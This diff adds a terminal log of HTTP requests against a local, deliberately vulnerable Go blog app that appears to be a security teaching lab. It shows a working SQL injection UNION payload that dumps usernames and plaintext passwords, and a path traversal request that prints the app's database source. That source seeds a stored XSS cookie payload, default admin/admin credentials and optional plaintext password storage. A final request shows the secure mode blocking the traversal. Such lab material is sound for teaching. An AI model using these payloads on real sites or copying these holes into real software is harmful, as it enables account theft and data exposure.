@@ -1,0 +1,287 @@
+$ http --ignore-stdin --print=hb GET :8114/api/search q==Miku
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 30 May 2026 04:11:12 GMT
+Content-Length: 275
+
+{"mode":"vulnerable (concatenated)","query":"Miku","results":[{"id":1,"title":"Miku Expo setlist notes","post_content":"Community notes after a Vocaloid watch party: setlist, visuals, favorite modules and links to fan translations.","published":1,"author_username":"admin"}]}
+$ http --ignore-stdin --print=hb GET :8114/api/search q=="zz' UNION SELECT ... users ... --"
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 30 May 2026 04:11:12 GMT
+Content-Length: 504
+
+{"mode":"vulnerable (concatenated)","query":"zz' UNION SELECT id, '[httpie user] ' || username, 'role=' || role || ' email=' || email || ' secret=' || password_hash, 1, username, '', '' FROM users --","results":[{"id":1,"title":"[httpie user] admin","post_content":"role=admin email=admin@example.com secret=admin","published":1,"author_username":"admin"},{"id":2,"title":"[httpie user] user1","post_content":"role=user email=user1@example.com secret=user1pass","published":1,"author_username":"user1"}]}
+$ http --ignore-stdin --print=hb GET :8114/api/files-vulnerable name==../internal/db/db.go
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Date: Sat, 30 May 2026 04:11:13 GMT
+Transfer-Encoding: chunked
+
+package db
+
+import (
+	"database/sql"
+	"html"
+	"log"
+	"os"
+	"regexp"
+
+	_ "github.com/mattn/go-sqlite3"
+	"golang.org/x/crypto/bcrypt"
+)
+
+const (
+	fallbackAdminUsername = "admin"
+	fallbackAdminPassword = "admin"
+	fallbackAdminEmail    = "admin@example.com"
+)
+
+var (
+	seedScriptTagRE        = regexp.MustCompile(`(?i)</?\s*script[^>]*>`)
+	seedEventAttributeRE   = regexp.MustCompile(`(?i)\s+on[a-z0-9_-]+\s*=\s*("[^"]*"|'[^']*'|[^\s>]+)`)
+	seedJavascriptSchemeRE = regexp.MustCompile(`(?i)javascript\s*:`)
+)
+
+func seededAdminCredentials() (username, password, email string) {
+	username = os.Getenv("ADMIN_USERNAME")
+	if username == "" {
+		username = fallbackAdminUsername
+	}
+
+	password = os.Getenv("ADMIN_PASSWORD")
+	if password == "" {
+		password = fallbackAdminPassword
+	}
+
+	email = os.Getenv("ADMIN_EMAIL")
+	if email == "" {
+		email = fallbackAdminEmail
+	}
+
+	return username, password, email
+}
+
+// InitDB opens (or creates) a SQLite database file at filepath and returns
+// the *sql.DB handle.
+func InitDB(filepath string) *sql.DB {
+	db, err := sql.Open("sqlite3", filepath)
+	if err != nil {
+		log.Fatalf("Failed to open database: %v", err)
+	}
+	if err = db.Ping(); err != nil {
+		log.Fatalf("Failed to connect to database: %v", err)
+	}
+	return db
+}
+
+// MigrateDB creates the blog, users, and comments tables if they do not already exist.
+func MigrateDB(db *sql.DB) {
+	createBlog := `
+	CREATE TABLE IF NOT EXISTS blog (
+		id              INTEGER PRIMARY KEY AUTOINCREMENT,
+		title           VARCHAR(255),
+		post_content    TEXT,
+		published       TINYINT(1),
+		author_username VARCHAR(50),
+		attachment_path VARCHAR(255),
+		attachment_name VARCHAR(255)
+	);`
+
+	createUsers := `
+	CREATE TABLE IF NOT EXISTS users (
+		id            INTEGER PRIMARY KEY AUTOINCREMENT,
+		username      VARCHAR(50)  UNIQUE,
+		password_hash VARCHAR(255),
+		email         VARCHAR(100) UNIQUE,
+		role          VARCHAR(20) NOT NULL DEFAULT 'user'
+	);`
+
+	createComments := `
+	CREATE TABLE IF NOT EXISTS comments (
+		id         INTEGER PRIMARY KEY AUTOINCREMENT,
+		post_id    INTEGER NOT NULL,
+		author     VARCHAR(50) NOT NULL DEFAULT 'anonymous',
+		body       TEXT NOT NULL,
+		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+	);`
+
+	for _, stmt := range []string{createBlog, createUsers, createComments} {
+		if _, err := db.Exec(stmt); err != nil {
+			log.Fatalf("MigrateDB error: %v", err)
+		}
+	}
+
+	addColumns := []struct {
+		table  string
+		column string
+		stmt   string
+	}{
+		{"blog", "author_username", "ALTER TABLE blog ADD COLUMN author_username VARCHAR(50)"},
+		{"blog", "attachment_path", "ALTER TABLE blog ADD COLUMN attachment_path VARCHAR(255)"},
+		{"blog", "attachment_name", "ALTER TABLE blog ADD COLUMN attachment_name VARCHAR(255)"},
+		{"users", "role", "ALTER TABLE users ADD COLUMN role VARCHAR(20) NOT NULL DEFAULT 'user'"},
+	}
+	for _, col := range addColumns {
+		exists, err := columnExists(db, col.table, col.column)
+		if err != nil {
+			log.Fatalf("MigrateDB inspect %s.%s error: %v", col.table, col.column, err)
+		}
+		if exists {
+			continue
+		}
+		if _, err := db.Exec(col.stmt); err != nil {
+			log.Fatalf("MigrateDB add %s.%s error: %v", col.table, col.column, err)
+		}
+	}
+}
+
+func columnExists(db *sql.DB, table, column string) (bool, error) {
+	rows, err := db.Query("PRAGMA table_info(" + table + ")")
+	if err != nil {
+		return false, err
+	}
+	defer rows.Close()
+
+	for rows.Next() {
+		var (
+			cid        int
+			name       string
+			columnType string
+			notNull    int
+			defaultVal sql.NullString
+			pk         int
+		)
+		if err := rows.Scan(&cid, &name, &columnType, &notNull, &defaultVal, &pk); err != nil {
+			return false, err
+		}
+		if name == column {
+			return true, nil
+		}
+	}
+	return false, rows.Err()
+}
+
+// SeedDB inserts dummy data into blog and users tables when they are empty.
+// In secure mode user passwords are stored as bcrypt hashes; in insecure mode
+// they are stored in plaintext (so the Sensitive Data Exposure scenario can be
+// demonstrated by inspecting the database directly).
+func SeedDB(db *sql.DB, securityEnabled bool) {
+	adminUsername, adminPassword, adminEmail := seededAdminCredentials()
+
+	// Seed blog posts
+	var postCount int
+	if err := db.QueryRow("SELECT COUNT(*) FROM blog").Scan(&postCount); err != nil {
+		log.Printf("SeedDB count blog error: %v", err)
+		return
+	}
+	if postCount == 0 {
+		posts := []struct {
+			title, content, author string
+			published              int
+		}{
+			{"Miku Expo setlist notes", "Community notes after a Vocaloid watch party: setlist, visuals, favorite modules and links to fan translations.", adminUsername, 1},
+			{"Fanart upload board rules", "Use attachments for sketches, cosplay references and cover art. Moderators review posts before featuring them on the front page.", adminUsername, 1},
+			// Post by user1 — used for the IDOR / Broken Access Control scenario.
+			{"Rin cosplay checklist", "This post belongs to user1. In insecure mode any authenticated member can delete it from the moderation queue.", "user1", 1},
+			// Hidden draft — used by the SQL Injection scenario to show that
+			// injected SQL can bypass the intended published-only view.
+			{"Unpublished Magical Mirai sponsor notes", "PRIVATE DRAFT: sponsor contact list, unreleased setlist notes and moderation decisions for the fan hub team.", adminUsername, 0},
+		}
+		for _, p := range posts {
+			if _, err := db.Exec(
+				"INSERT INTO blog (title, post_content, published, author_username) VALUES (?, ?, ?, ?)",
+				p.title, p.content, p.published, p.author,
+			); err != nil {
+				log.Printf("SeedDB blog error: %v", err)
+			}
+		}
+	}
+
+	// Seed a demo XSS comment on post 1 when the comments table is empty.
+	var commentCount int
+	if err := db.QueryRow("SELECT COUNT(*) FROM comments").Scan(&commentCount); err != nil {
+		log.Printf("SeedDB count comments error: %v", err)
+	} else if commentCount == 0 {
+		// This stored XSS payload is intentionally inserted in insecure mode so
+		// the comment workflow shows the issue out of the box. In secure mode the
+		// body is HTML-escaped before storage, so the script tag is inert.
+		xssBody := `<img src=x onerror="alert('Stored XSS! cookie='+document.cookie)"> — suspicious fan comment`
+		xssBody = encodeCommentForSeed(xssBody, securityEnabled)
+		if _, err := db.Exec(
+			"INSERT INTO comments (post_id, author, body) VALUES (1, 'attacker', ?)",
+			xssBody,
+		); err != nil {
+			log.Printf("SeedDB comments error: %v", err)
+		}
+	}
+
+	// Seed users
+	var userCountCheck int
+	if err := db.QueryRow("SELECT COUNT(*) FROM users").Scan(&userCountCheck); err != nil {
+		log.Printf("SeedDB count users error: %v", err)
+		return
+	}
+
+	// Demo accounts are intentionally mode-aware. Re-seeding the app after a
+	// vulnerable/secure switch must not leave plaintext passwords in secure mode
+	// or bcrypt hashes in vulnerable mode for the predefined lab users.
+	users := []struct{ username, password, email, role string }{
+		{adminUsername, adminPassword, adminEmail, "admin"},
+		{"user1", "user1pass", "user1@example.com", "user"},
+	}
+	for _, u := range users {
+		if err := upsertSeedUser(db, u.username, u.password, u.email, u.role, securityEnabled); err != nil {
+			log.Printf("SeedDB users error for %s: %v", u.username, err)
+		}
+	}
+}
+
+// encodePasswordForSeed returns the plaintext password in insecure mode and
+// a bcrypt hash in secure mode.
+func encodePasswordForSeed(password string, securityEnabled bool) (string, error) {
+	if !securityEnabled {
+		return password, nil
+	}
+	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
+	if err != nil {
+		return "", err
+	}
+	return string(hash), nil
+}
+
+func upsertSeedUser(db *sql.DB, username, password, email, role string, securityEnabled bool) error {
+	stored, err := encodePasswordForSeed(password, securityEnabled)
+	if err != nil {
+		return err
+	}
+
+	_, err = db.Exec(
+		`INSERT INTO users (username, password_hash, email, role)
+		 VALUES (?, ?, ?, ?)
+		 ON CONFLICT(username) DO UPDATE SET
+		     password_hash = excluded.password_hash,
+		     email = excluded.email,
+		     role = excluded.role`,
+		username, stored, email, role,
+	)
+	return err
+}
+
+func encodeCommentForSeed(body string, securityEnabled bool) string {
+	if !securityEnabled {
+		return body
+	}
+	cleaned := seedScriptTagRE.ReplaceAllString(body, "")
+	cleaned = seedEventAttributeRE.ReplaceAllString(cleaned, "")
+	cleaned = seedJavascriptSchemeRE.ReplaceAllString(cleaned, "")
+	return html.EscapeString(cleaned)
+}
+
+$ http --ignore-stdin --print=hb GET :8114/api/files-secure name==../internal/db/db.go
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+Date: Sat, 30 May 2026 04:11:14 GMT
+Content-Length: 108
+
+{"detail":"resolved path escapes the uploads directory","error":"path traversal detected — access denied"}
